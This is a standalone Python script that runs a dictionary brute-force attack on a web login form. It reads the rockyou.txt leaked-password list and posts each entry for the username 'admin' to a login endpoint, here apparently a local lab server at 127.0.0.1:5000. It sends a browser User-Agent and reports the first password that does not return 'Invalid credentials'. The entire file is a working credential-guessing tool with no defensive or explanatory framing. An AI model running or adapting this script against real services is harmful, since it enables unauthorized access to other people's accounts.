import requests
import time

URL = "http://127.0.0.1:5000/login"

USERNAME = "admin"

FAIL_TEXT = "Invalid credentials"

session = requests.Session()

with open("rockyou.txt", "r", errors="ignore") as f:
    passwords = [x.strip() for x in f if x.strip()]

headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}

print(f"[+] Loaded {len(passwords)} passwords")
print(f"[*] Starting brute force on username: {USERNAME}\n")

for password in passwords:

    payload = {
        "username": USERNAME,
        "password": password,
    }

    r = session.post(
        URL,
        json=payload,   # IMPORTANT
        headers=headers
    )

    print(f"[*] Testing: {password}")
    print(f"Status: {r.status_code}")

    # DEBUG
    print(r.text[:300])

    # Only consider HTTP 200
    if r.status_code == 200:

        if FAIL_TEXT not in r.text:

            print(f"\n[+] PASSWORD FOUND: {password}")
            break

    time.sleep(0.1)